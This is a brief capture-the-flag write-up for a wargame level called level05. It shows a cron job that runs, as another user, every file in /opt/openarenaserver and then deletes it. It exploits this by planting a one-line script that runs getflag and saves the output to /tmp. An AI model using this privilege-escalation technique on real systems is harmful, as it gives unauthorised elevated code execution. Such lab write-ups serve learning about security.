<h1 align="center"> level05 </h1>

```shell
find / -user flag05 2> /dev/null
```

We have ```/usr/sbin/openarenaserver```

```shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

And in the mail, location given by the env var: ```MAIL=/var/mail/level05```:
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

It's a cron job, who execute the script above every 2 minutes.

The script execute every file in the /opt/openarenaserver folder and delete it. So we need to save the result to a file.

```shell
echo "getflag > /tmp/getflag" > /opt/openarenaserver/getflag
```

We wait a little and we have the getflag code, who give us access to the next level, it work !
